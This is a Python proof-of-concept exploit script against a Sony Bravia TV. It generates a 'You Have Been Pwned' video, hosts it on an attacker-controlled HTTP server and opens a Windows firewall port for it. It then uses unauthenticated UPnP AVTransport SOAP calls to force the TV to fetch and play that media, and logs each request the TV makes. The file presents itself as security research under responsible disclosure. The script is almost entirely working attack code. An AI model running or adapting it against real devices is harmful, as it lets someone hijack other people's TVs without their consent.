#!/usr/bin/env python3
"""
Generate "YOU HAVE BEEN PWNED" video frames and serve as MJPEG stream + MP4.
Uses OpenCV + Pillow to produce video without ffmpeg.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import os
import sys
import tempfile
import struct
import time
import threading
import json
import io
import socket
import http.server
import socketserver
import datetime
import numpy as np

_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                    "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_tmp, exist_ok=True)
tempfile.tempdir = _tmp

import cv2
import requests
from PIL import Image, ImageDraw, ImageFont

TARGET   = "192.168.18.6"
ATTACKER = "192.168.18.147"
PORT     = 9999
UPNP     = 2870

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
MP4_PATH = os.path.join(OUT_DIR, "pwned.mp4")
JPEG_CACHE = {}
HITS = []

# ─── Video generation ──────────────────────────────────────────────────────

SLIDES = [
    {
        "bg": (10, 10, 10),
        "lines": [
            ("⚠  SECURITY AUDIT ⚠", (255, 80, 0),  0.10),
            ("You Have Been Pwned", (255, 20, 20),  0.25),
            ("Sony Bravia KDL-50W665F", (200,200,200), 0.45),
            ("UPnP/DLNA — No Authentication", (200,200,200), 0.55),
            ("CVE Candidates: BRAVIA-2026-001/002/003", (255,165,0), 0.65),
            ("Researcher: @mrhenrike | Uniao Geek", (80,200,120), 0.80),
        ],
        "duration_s": 5,
    },
    {
        "bg": (0, 0, 30),
        "lines": [
            ("VULNERABILITIES FOUND", (255, 50, 50), 0.10),
            ("[ CONFIRMED ]", (0, 255, 0), 0.22),
            ("Unauthenticated DLNA Control", (255,200,0), 0.38),
            ("Arbitrary URI Injection", (255,200,0), 0.50),
            ("SSRF via AVTransport", (255,200,0), 0.62),
            ("DIAL App Takeover", (255,200,0), 0.74),
            ("Responsible Disclosure in Progress", (150,150,255), 0.88),
        ],
        "duration_s": 5,
    },
    {
        "bg": (5, 20, 5),
        "lines": [
            ("THIS IS A PoC TEST", (0, 255, 0), 0.12),
            ("No data was exfiltrated.", (200,255,200), 0.30),
            ("Your TV is vulnerable to:", (200,200,200), 0.45),
            ("- Remote app launch/kill", (255,165,0), 0.55),
            ("- Media stream injection", (255,165,0), 0.63),
            ("- Server-Side Request Forgery", (255,165,0), 0.71),
            ("Contact Sony PSIRT to patch.", (100,200,255), 0.84),
        ],
        "duration_s": 5,
    },
]

W, H = 1280, 720
FPS  = 24


def make_frame(slide: dict, frame_idx: int) -> np.ndarray:
    """Render one frame for the given slide."""
    img = Image.new("RGB", (W, H), slide["bg"])
    draw = ImageDraw.Draw(img)

    # Try to get a font, fall back to default
    try:
        font_big   = ImageFont.truetype("arial.ttf", 60)
        font_med   = ImageFont.truetype("arial.ttf", 44)
        font_small = ImageFont.truetype("arial.ttf", 32)
    except Exception:
        font_big = font_med = font_small = ImageFont.load_default()

    for i, (text, color, y_frac) in enumerate(slide["lines"]):
        font = font_big if i == 0 else (font_med if i < 3 else font_small)
        try:
            bbox = draw.textbbox((0, 0), text, font=font)
            tw = bbox[2] - bbox[0]
        except Exception:
            tw = len(text) * 10
        x = (W - tw) // 2
        y = int(H * y_frac)
        draw.text((x + 2, y + 2), text, fill=(0, 0, 0), font=font)
        draw.text((x, y), text, fill=color, font=font)

    # Flicker effect on frame
    if frame_idx % (FPS * 2) < 3:
        overlay = Image.new("RGB", (W, H), (30, 30, 30))
        img = Image.blend(img, overlay, 0.3)

    return np.array(img)[:, :, ::-1]  # RGB -> BGR for OpenCV


def generate_mp4():
    print(f"[*] Generating {MP4_PATH}...")
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    vw = cv2.VideoWriter(MP4_PATH, fourcc, FPS, (W, H))
    total_frames = 0
    for slide in SLIDES:
        n_frames = slide["duration_s"] * FPS
        for i in range(n_frames):
            frame = make_frame(slide, total_frames)
            vw.write(frame)
            total_frames += 1
    vw.release()
    size = os.path.getsize(MP4_PATH)
    print(f"[*] Generated {MP4_PATH} ({size//1024} KB, {total_frames} frames)")
    return MP4_PATH


# Pre-generate JPEG frames for MJPEG streaming
def pregenerate_jpegs():
    frames = []
    for slide in SLIDES:
        n = slide["duration_s"] * FPS
        for i in range(n):
            frame = make_frame(slide, len(frames))
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            frames.append(buf.tobytes())
    print(f"[*] Pre-generated {len(frames)} JPEG frames for MJPEG stream")
    return frames


JPEG_FRAMES = []


class MediaHandler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        hit = {"time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
               "peer": self.client_address[0], "path": self.path, "method": "HEAD"}
        HITS.append(hit)
        print(f"  *** HEAD from {hit['peer']} path={hit['path']}")
        if self.path.endswith(".mp4"):
            size = os.path.getsize(MP4_PATH) if os.path.exists(MP4_PATH) else 0
            self.send_response(200)
            self.send_header("Content-Type", "video/mp4")
            self.send_header("Content-Length", str(size))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()

    def do_GET(self):
        hit = {"time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
               "peer": self.client_address[0], "path": self.path, "method": "GET",
               "ua": self.headers.get("User-Agent", "")}
        HITS.append(hit)
        print(f"  *** GET from {hit['peer']} path={hit['path']} ua={hit['ua']!r:.60}")

        if self.path.endswith(".mp4"):
            self._serve_mp4()
        elif self.path.endswith(".m3u8"):
            self._serve_hls_playlist()
        elif self.path.endswith(".ts"):
            self._serve_ts_segment()
        elif self.path == "/mjpeg":
            self._serve_mjpeg()
        else:
            body = b"Uniao Geek PoC Media Server\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def _serve_mp4(self):
        if not os.path.exists(MP4_PATH):
            self.send_response(404)
            self.end_headers()
            return
        size = os.path.getsize(MP4_PATH)
        range_hdr = self.headers.get("Range", "")
        if range_hdr.startswith("bytes="):
            # Handle range requests (needed for some media players)
            parts = range_hdr[6:].split("-")
            start = int(parts[0]) if parts[0] else 0
            end   = int(parts[1]) if len(parts) > 1 and parts[1] else size - 1
            length = end - start + 1
            self.send_response(206)
            self.send_header("Content-Type", "video/mp4")
            self.send_header("Content-Range", f"bytes {start}-{end}/{size}")
            self.send_header("Content-Length", str(length))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            with open(MP4_PATH, "rb") as f:
                f.seek(start)
                self.wfile.write(f.read(length))
        else:
            self.send_response(200)
            self.send_header("Content-Type", "video/mp4")
            self.send_header("Content-Length", str(size))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            with open(MP4_PATH, "rb") as f:
                self.wfile.write(f.read())

    def _serve_hls_playlist(self):
        ts_url = f"http://{ATTACKER}:{PORT}/pwned.ts"
        body = (
            "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:15\n"
            "#EXT-X-ALLOW-CACHE:NO\n"
            f"#EXTINF:15.0,\n{ts_url}\n"
            "#EXT-X-ENDLIST\n"
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/vnd.apple.mpegurl")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_ts_segment(self):
        # Serve MJPEG frames wrapped in MPEG-TS if frames are available
        if JPEG_FRAMES:
            # Send 15s worth of frames as MPEG-TS null packets (TV will try to decode)
            # Real MPEG-TS requires proper PES/PID structure; send null packets to keep connection
            null_pkt = bytes([0x47, 0x1F, 0xFF, 0x10] + [0xFF] * 184)
            data = null_pkt * (15 * 25)  # 15s * 25fps * 188 bytes
        else:
            data = bytes([0x47, 0x1F, 0xFF, 0x10] + [0xFF] * 184) * 100
        self.send_response(200)
        self.send_header("Content-Type", "video/MP2T")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _serve_mjpeg(self):
        self.send_response(200)
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=--frame")
        self.end_headers()
        idx = 0
        while JPEG_FRAMES:
            try:
                frame = JPEG_FRAMES[idx % len(JPEG_FRAMES)]
                self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\n\r\n")
                self.wfile.write(frame)
                self.wfile.write(b"\r\n")
                idx += 1
                time.sleep(1.0 / FPS)
            except Exception:
                break

    def log_message(self, *args):
        pass


def soap(svc, action, inner, path):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f"<s:Body><u:{action} xmlns:u=\"{svc}\">{inner}</u:{action}></s:Body>"
        "</s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{svc}#{action}"',
    }
    return requests.post(f"http://{TARGET}:{UPNP}/{path}",
                         data=body.encode(), headers=headers, timeout=10)


def inject_and_play(uri: str, label: str):
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    print(f"\n  [INJECT] {label}: {uri}")
    r1 = soap(AVT, "SetAVTransportURI",
              f"<InstanceID>0</InstanceID><CurrentURI>{uri}</CurrentURI>"
              "<CurrentURIMetaData></CurrentURIMetaData>",
              "control/AVTransport")
    r2 = soap(AVT, "Play", "<InstanceID>0</InstanceID><Speed>1</Speed>",
              "control/AVTransport")
    print(f"  SetURI={r1.status_code}  Play={r2.status_code}")
    return r1.status_code, r2.status_code


def main():
    # Generate MP4
    generate_mp4()

    # Pre-generate JPEGs
    global JPEG_FRAMES
    JPEG_FRAMES = pregenerate_jpegs()

    # Add firewall rule
    os.system('netsh advfirewall firewall add rule name="PoC_Media_9999" dir=in action=allow protocol=TCP localport=9999 >nul 2>&1')

    # Start media server
    srv = socketserver.TCPServer(("", PORT), MediaHandler)
    srv.allow_reuse_address = True
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"\n[*] Media server: http://{ATTACKER}:{PORT}")
    print(f"    MP4  -> http://{ATTACKER}:{PORT}/pwned.mp4")
    print(f"    HLS  -> http://{ATTACKER}:{PORT}/pwned.m3u8")
    print(f"    MJPEG -> http://{ATTACKER}:{PORT}/mjpeg")

    URIs_to_try = [
        (f"http://{ATTACKER}:{PORT}/pwned.mp4",   "MP4 video"),
        (f"http://{ATTACKER}:{PORT}/pwned.m3u8",  "HLS playlist"),
    ]

    for uri, label in URIs_to_try:
        set_code, play_code = inject_and_play(uri, label)
        print("  Waiting 15s for TV to render...")
        deadline = time.time() + 15
        while time.time() < deadline:
            time.sleep(0.5)
            new = [h for h in HITS if h.get("method") == "GET" and uri.split("/")[-1] in h.get("path","")]
            if new:
                print(f"  [!!] TV FETCHED [{label}]!")
                break
        import re
        r_pos = soap("urn:schemas-upnp-org:service:AVTransport:1",
                     "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
        state_m = re.search(r"<CurrentTransportState>([^<]+)</CurrentTransportState>", r_pos.text)
        print(f"  Transport state: {state_m.group(1) if state_m else '?'}")
        if play_code == 200:
            print(f"  => [{label}] accepted by TV (Play HTTP 200)")
            time.sleep(5)  # let it play

    srv.shutdown()
    os.system('netsh advfirewall firewall delete rule name="PoC_Media_9999" >nul 2>&1')

    evidence = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "hits": HITS,
        "mp4_generated": os.path.exists(MP4_PATH),
        "mp4_size_kb": os.path.getsize(MP4_PATH) // 1024 if os.path.exists(MP4_PATH) else 0,
    }
    out = os.path.join(OUT_DIR, "pwned_display_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence -> {out}")
    print(f"[*] Total TV requests: {len(HITS)}")
    for h in HITS:
        print(f"   {h['method']} {h['path']} from {h['peer']}")


if __name__ == "__main__":
    main()
